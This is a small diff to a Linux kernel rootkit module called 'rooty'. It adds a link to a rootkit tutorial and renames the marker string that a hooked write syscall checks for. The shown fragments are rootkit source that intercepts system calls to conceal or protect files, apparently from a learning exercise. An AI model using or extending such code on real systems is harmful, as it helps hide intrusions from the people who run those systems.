@@ -9,6 +9,8 @@
 
 MODULE_LICENSE("GPL");
 
+/*http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html*/
+
 int rooty_init(void);
 void rooty_exit(void);
 module_init(rooty_init);
@@ -42,7 +44,7 @@ psize **find(void) {
 
 asmlinkage ssize_t rooty_write(int fd, const char __user *buff, ssize_t count) {
  int r;
- char *proc_protect = ".rooty";
+ char *proc_protect = ".TEST";
  char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuff,buff,255);
  if (strstr(kbuff,proc_protect)) {
